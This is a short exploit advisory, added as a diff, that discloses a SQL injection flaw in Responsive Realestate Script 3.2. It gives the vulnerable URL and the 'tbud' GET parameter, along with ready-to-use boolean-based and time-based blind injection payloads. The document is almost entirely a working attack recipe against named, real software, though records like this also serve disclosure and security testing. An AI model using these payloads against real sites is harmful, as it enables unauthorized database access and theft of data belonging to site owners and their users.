@@ -1,0 +1,35 @@
+# # # # # 
+# Exploit Title: Responsive Realestate Script 3.2 - SQL Injection
+# Dork: N/A
+# Date: 09.12.2017
+# Vendor Homepage: https://www.phpscriptsmall.com/
+# Software Link: https://www.phpscriptsmall.com/product/responsive-realestate-script/
+# Version: 3.2
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+# # # # #
+# Exploit Author: Ihsan Sencan
+# Author Web: http://ihsan.net
+# Author Social: @ihsansencan
+# # # # #
+# Description:
+# The vulnerability allows an attacker to inject sql commands....
+# 
+# Proof of Concept: 
+# 
+# 1)
+# http://localhost/[PATH]/property-list?tbud=5001-10000[SQL]&quicksrch1=
+# 
+# 34 columns
+# 
+# Parameter: tbud (GET)
+#     Type: boolean-based blind
+#     Title: AND boolean-based blind - WHERE or HAVING clause
+#     Payload: tbud=5001-10000 AND 4719=4719&quicksrch1=
+# 
+#     Type: AND/OR time-based blind
+#     Title: MySQL >= 5.0.12 AND time-based blind
+#     Payload: tbud=5001-10000 AND SLEEP(5)&quicksrch1=
+# 
+# # # # #
